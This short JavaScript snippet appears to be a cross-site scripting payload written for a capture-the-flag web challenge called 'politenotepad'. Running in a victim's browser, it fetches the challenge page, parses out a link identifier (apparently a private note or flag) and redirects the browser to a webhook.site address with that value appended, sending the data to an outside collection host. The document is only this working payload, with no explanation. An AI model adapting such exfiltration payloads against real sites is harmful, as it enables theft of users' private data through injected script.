fetch("http://politenotepad.zajebistyc.tf/").then( r => r.text() ).then( r =>

window.location = "https://webhook.site/f6ca6116-5afa-46f2-84b5-175025c85670/"+
new DOMParser().parseFromString(r, "text/html").querySelector('li:not([class]) > a').href.match( /[^\/]+$/ )[0]
);
